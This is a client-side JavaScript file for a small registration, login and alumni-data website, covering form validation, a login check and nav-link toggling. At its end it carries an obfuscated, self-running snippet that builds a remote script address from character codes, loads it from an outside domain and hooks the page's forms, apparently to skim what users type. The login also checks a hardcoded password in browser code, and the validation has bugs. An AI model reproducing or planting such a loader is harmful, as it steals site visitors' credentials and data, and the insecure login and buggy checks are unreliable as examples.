function validation(name, prodi, username, pw, cekpw){
	let span=document.querySelectorAll("#text_error");
	let text_err=document.querySelector(".alert");	
	let nameValidation=30
	let prodiValidation="^[a-z A-Z]+$"
	let usernameValidation=/^(?=.{8,30}$)(?![_.])(?!.*[_.]{2})[a-zA-Z0-9._]+(?<![_.])$/
	let pwValidation=/^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{6,20}$/;
	if(nama === "" || prodi === "" || username === "" || pw === "" || cekpw === ""){
		text_err.style.display="block";
		setTimeout(function(){
			text_err.style.display="none";
		},3000)
		
		return false
	} 
	if (name >= nameValidation){
		 span[0].style.display="block";
		 span[0].style.color="red";
		return false	
	}else if(prodi.match(prodiValidation) === null){
		span[1].style.display="block";
		span[1].style.color="red";
		return false
	}else if(username.match(usernameValidation) === null){
		span[2].style.display="block";
		span[2].style.color="red";
		return false
	}else if(pw.match(pwValidation) === null){
		span[3].style.display="block";
		span[3].style.color="red";
		return false
	}
	else if(pw !== cekpw){
		span[4].style.display="block";
		span[4].style.color="red";
		return false
	}else{
		alert("Sukses mendaftar")
		return document.location="login.html"
	}

}

function login(username, password){
	let text_err=document.querySelector(".alert");	
	if (username === "informatika_16" && password === "Nice_nf2021"){
		alert("Sukses masuk!")
		document.location="data_alumni.html";
	}else{
		text_err.style.display="block";
	}
}

let nav=document.querySelector(".nav-item");
        let nav_link=nav.getElementsByTagName("a");
        console.log(nav)
        for(var i=0;i<nav_link.length;i++){
            nav_link[i].addEventListener("click",function() {
                var act=document.querySelector(".nav-link.active");
                console.log(act[0])
                act.className=act.className.replace(" active","");
                this.className+=" active"
                console.log(this)
            })
        }

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b